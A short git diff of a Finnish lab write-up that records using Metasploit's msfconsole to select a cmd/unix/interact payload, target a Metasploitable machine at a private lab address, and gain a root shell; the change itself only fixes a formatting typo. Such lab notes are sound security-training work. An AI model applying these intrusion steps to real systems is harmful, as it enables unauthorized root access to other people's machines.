@@ -99,7 +99,7 @@ mfsconsolessa:
 - Valitsin hyökkäyksen (valitsin yhden esimerkeistä): ``use 1`` eli cmd/unix/interact
 - Valitsin kohteen: ``set RHOSTS 192.168.56.102``
 - Suoritin hyökkäyksen: ``run``
-- ``whoami``, ``uname -a`-> olen root, Metasploitablen komentorivillä
+- ``whoami``, ``uname -a``-> olen root, Metasploitablen komentorivillä
   
 
 ![image](https://github.com/user-attachments/assets/1bc74376-e719-4442-bbdb-43582d7212b7)
